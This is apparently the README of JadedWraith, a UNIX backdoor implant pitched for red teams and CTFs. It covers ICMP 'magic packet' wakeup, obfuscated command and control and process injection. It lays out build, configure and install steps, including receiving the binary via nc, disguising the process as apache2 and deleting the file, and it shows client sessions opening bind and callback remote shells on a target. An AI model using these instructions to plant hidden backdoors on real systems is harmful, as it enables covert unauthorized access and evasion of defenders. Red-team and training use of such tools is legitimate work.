# JadedWraith

Lightweight UNIX backdoor for ethical hacking. Useful for red team engagements and CTFs. Something I wrote a few years ago as part of a game I was playing with a friend to try to backdoor as many VMs in each other's labs without being caught or having our tools reverse engineered/signatured.

## Features

JadedWraith is a powerful backdoor capable of either listening on a TCP port or sniffing packets for a "magic" ICMP packet instructing the backdoor to either callback or listen. This is partly inspired by tools such as [PRISM](https://github.com/andreafabrizi/prism), however, unlike PRISM JadedWraith incorporates shoddy cryptography to obfuscate command and control. JadedWraith can be used to execute remote commands or upload follow on payloads.

JadedWraith can be compiled as a standalone executable or as a shared object for process injection. 
 
## Components

The source code for the actual implant can be found inside the `src` directory. `client` contains a simple python based client for interacting with JadedWraith. The `conf_jawr` script is used to configure new JadedWraith executables.

## Dependencies
The implant requires a modern C library and libpthread. Depending on the target operating system, libpcap may be required (In which case, it you must run the `./configure` script with `--use-libpcap` to enable libpcap support).

The Python configuration script and client require the the following packages to work: termcolor, pycryptodomex

## How to compile
Simply use the `Makefile` to compile. Note: The resulting binaries found in `bin` must be configured before they can be used.
```
$ ./configure
$ make
$ ls -lart bin
-rwxrwxr-x. 1 root root 19712 Jul 31 13:08 JadedWraith-2.0.0-Linux-x86_64.elf
```

## How to configure

Use the `conf_jawr` script to configure JadedWraith executables. It will search the `bin` directory for JadedWraith executables to configure. The configured binary will be written to the `configured` directory.

```
$ ./conf_jawr
JadedWraith Configuration

Please choose a JadedWraith binary to use: 
    1. JadedWraith-2.0.0-Linux-x86_64.elf
Binary : 1
Shared Key [95454c93c8d5d30a0782da72ade10e29] : 
Enable passive mode (ICMP wakeup) ? [y/n] y
Wakeup Password [4Zw2TTtaIKBcyeoLwd7rrTasRlUF90vSZnLFzn2A4ab018Vj] : 
argv[0] (Leave blank to not spoof command) [] : 

JadedWraith Executable : /tmp/JadedWraith/configured/builds/JadedWraith-2.0.0-Linux-x86_64.1627752415.bin

Try me!
   sudo ./wraith-client.py <IP_ADDRESS> -k 95454c93c8d5d30a0782da72ade10e29 -P 4Zw2TTtaIKBcyeoLwd7rrTasRlUF90vSZnLFzn2A4ab018Vj shell
```

## How to install
A configured implant can simply be ran on the target system. If configured to use the passive ICMP functionality, it must be ran as root. The environmental variable _CMD can be used to spoof the process's `argv[]`

```
# cd /tmp
# nc -lvp 4444 > apache2
# chmod +x apache2
# _CMD="/usr/sbin/apache2" ./apache2
# rm apache2
```

## How to interact
The `wraith-client.py` script inside `client` can be used to interact with JadedWraith. Simply invoke it with the arguments produced by the `conf_jawr` script, substituting the target's IP for `<IP_ADDRESS>`. If utilizing the ICMP functionality, the script must be ran as root to send the ICMP packet.


```
$ ~/JadedWraithFork/client> sudo ./wraith-client.py 192.168.100.224 -k 1deeb4a64440b8d13c84a8eb4e7c4453 -P y00nrnwpwXdvPOXSS6K0r7LelFeCBvKx91Oj0s5BrnLyx1WR shell
[+] sent ICMP wake up command to 192.168.100.224
[*] backdoor will listen on port 58290
[*] connecting to 192.168.100.224:58290
[+] connection established!
[*] entering interactive shell
>> .cd /tmp 
>> w
 14:22:49 up  3:02,  1 user,  load average: 0.18, 0.19, 0.23
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
>> ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 11:20 ?        00:00:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 31
>> .exit
$ sudo ./wraith-client.py 127.0.0.1 --callback 192.168.100.224 -k 1deeb4a64440b8d13c84a8eb4e7c4453 -P y00nrnwpwXdvPOXSS6K0r7LelFeCBvKx91Oj0s5BrnLyx1WR shell
[+] sent ICMP wake up command to 127.0.0.1
[*] backdoor will connect to port 37943
[*] listening on port 37943
[+] accepted connection!
[*] entering interactive shell
>> 
```

## Bugs
I'm sure this has plenty of bugs. Let me know if you find any. I wrote this over a few days and the code isn't my proudest. Feel free to report any issues and I'll try to fix them. 